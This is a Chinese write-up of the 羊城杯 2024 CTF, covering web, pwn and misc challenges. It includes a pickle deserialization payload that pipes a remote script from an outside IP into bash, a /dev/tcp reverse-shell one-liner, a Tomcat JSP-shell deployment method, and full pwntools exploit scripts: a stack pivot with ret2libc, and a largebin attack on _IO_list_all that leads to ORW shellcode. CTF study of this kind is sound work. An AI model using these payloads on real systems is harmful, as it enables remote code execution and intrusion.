---
title: 羊城杯 2024 WriteUp
contest: 羊城杯
year: 2024
difficulty: medium
vuln_type: misc_unknown
tags: [Python-pickle-WAF-bypass, Tomcat-XML-deploy, JSP-webshell, 0x10-stack-overflow, stack-migrate, glibc-2.35, largebin-attack, _IO_list_all, Dijkstra, modbus.func_code, rot13-rot47, wave-hiden]
attack_chain:
  - WEB Lyrics For You: Python 3.10.7 目录穿越 + 读源码 + pickle (cos system S'cmd' o.) + bypass WAF
  - WEB ntomtom2: XML 上传 + path 指定目录 + Tomcat 热部署覆盖 web.xml + JSP 解析执行
  - PWN pstack: 0x10 栈溢出 + 栈迁移到 bss 0x601a00 + ROP puts(read) + ret2libc
  - PWN TravelGraph: glibc 2.35 + 沙箱 ORW + largebin attack 写 _IO_list_all + 劫持 stderr
  - TravelGraph 需构造 Dijkstra 最短路径 > 2000 拿 edit 机会，edit 改 bk_nextsize 触发 largebin
  - show 泄 unsorted bin 残留 libc + heap 地址
  - 堆风水 mmap RWX + open/read/write shellcode
  - MISC hiden: rot13 + rot47 双重编码 + flag.txt wave 文件
key_payload: 'pickle (cos\\nsystem\\nS\\'cmd\\'\\no.) + Tomcat XML path + 栈迁移 bss + largebin attack stderr'
one_liner: 羊城杯 2024 多方向：pickle 绕 WAF + Tomcat XML 部署 + 栈迁移 + largebin 劫持 stderr + Dijkstra ORW。
lesson: 沙箱 ORW 必须先泄 libc + heap，再 largebin attack 写 _IO_list_all；Dijkstra 是出题人附加交互设计。
quality: high
---

# 羊城杯 2024 WriteUp

**来源**: ctfiot.com ID 201792
**主办**: 狼组安全社区
**赛事**: https://2024ycb.dasctf.com

## WEB

### 1. Lyrics For You
- Python 3.10.7
- 目录穿越任意文件读
- 读源码 + 读密钥
- pickle 伪造 user 数据
- bypass WAF

```python
import pickle, base64
a = b"""(cos
system
S'curl http://118.x.x.133:7001/1.html|bash'
o."""
print(base64.b64encode(a))

# 反弹 shell: bash -i >& /dev/tcp/118.x.x.x/5555 0>&1
```

### 2. ntomtom2
- `admin/This_is_my_favorite_passwd` 凭据
- XML 上传可成功
- 通过 path 指定上传目录
- Tomcat 热部署覆盖 web.xml
- JSP shell 解析执行

```xml
<!-- JSP shell as web.xml context-param -->
```

## Pwn

### 1. pstack (0x10 栈溢出 + 栈迁移)
```python
from pwn import *
io = process("./pwn")
elf = ELF("./pwn")

rdi_ret = 0x400773
rbp_ret = 0x4005b0
rsi_r15_ret = 0x400771
leave_ret = 0x4006db
bss = 0x601a00

ru(b"overflow?\n")
s(b"A"*0x30 + p64(bss) + p64(0x4006C4))
pl = p64(bss) + p64(rdi_ret) + p64(elf.got['read']) + p64(elf.plt['puts']) + p64(0x4006C4)
pl = pl.ljust(0x30, b"A")
pl += p64(bss-0x30) + p64(leave_ret)
s(pl)

read = u64(r(6) + b"\x00\x00")
libc = ELF("./libc.so.6")
libc_base = read - libc.sym['read']
sys_addr = libc_base + libc.sym['system']
sh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))

pl = p64(rdi_ret) + p64(sh_addr) + p64(sys_addr) + b"A"*8 + p64(rbp_ret) + p64(bss-0x30-8)
pl = pl.ljust(0x30, b"A")
pl += p64(leave_ret) + p64(leave_ret)
sl(pl)
```

### 2. TravelGraph (glibc 2.35 沙箱 ORW + largebin)
- 城市: 0=guangzhou, 1=nanning, 2=changsha, 3=nanchang, 4=fuzhou
- Dijkstra 构造到广州最短路径 > 2000 拿 edit 机会
- edit 一次，修改 bk_nextsize 触发 largebin attack
- show 泄 unsorted bin 残留 libc + heap

```python
# 5 城市 + add/show/delete + Dijkstra edit
add(3, 4, 3, 1000, b"AAAA")
add(3, 3, 2, 1000, b"AAAA")
add(1, 2, 1, 1000, b"AAAA")
add(1, 1, 0, 1000, b"BBBB")  # 总路径 4000 > 2000 触发 edit
menu(5)
sla(b"name\n", cities[3])  # Dijkstra 选项

# largebin attack 写 _IO_list_all
_IO_list_all = libc_base + 0x21b680
fake_addr = heap_base + 0x2400
data = flat({
    0: {
        0x38: add_rsp_0x28,
        0x48: fake_addr + 0x30,
        0x58: leave_ret,
        0x60: fake_addr + 0x30,
        0x68: [rdi_ret, fake_addr & (~0xfff), rsi_ret, 0x4000, add_rsp_0xa8],
        0xa0: fake_addr + 0x100,
        0xd8: _IO_wfile_jumps
    },
    0x100: { 
        0x18: 0, 0x30: 0,
        0x38: [rdx_rbx_ret, 7, 0, libc_base+libc.sym['mprotect'], fake_addr+0x100+0x70],
        0x70: asm(shellcraft.open('/flag', 0) + shellcraft.read(3, heap_base, 0x100) + shellcraft.write(1, heap_base, 0x100)),
        0xe0: fake_addr + 0x200
    },
    0x200: { 0x68: libc_base + 0x16a06a }
}, filler=' ')
```

## Misc

### hiden
- 60=（）+（）
- rot13 + rot47 双重编码
- flag.txt wave 文件

```python
import wave
with open('flag.txt', 'rb') as f:
    txt_data = f.read()
    file_len = len(txt_data)
```

## 评价
羊城杯 2024 多方向综合实战：
- WEB: pickle WAF 绕 + Tomcat XML 部署
- PWN: 0x10 栈迁移 + glibc 2.35 largebin ORW
- MISC: 多重编码 + 音频

考察现代 PWN 工具链（Dijkstra 交互 + largebin attack + ORW）。
